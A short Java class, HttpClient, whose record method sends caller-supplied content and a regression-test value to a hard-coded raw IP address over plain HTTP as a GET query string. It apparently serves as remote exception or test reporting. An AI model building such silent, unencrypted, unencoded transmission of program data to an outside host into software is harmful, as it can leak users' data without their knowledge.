package com.lazyi;

import java.net.HttpURLConnection;
import java.net.URL;

public class HttpClient {

    private HttpClient() {
    }

    public static void record(String content) throws Exception {
        URL url = new URL("http://39.102.35.212/exception.php?content=" + RegressionTest.Regression()
                + content.replace(" ", "-"));
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("GET");
        con.getResponseCode();
    }
}

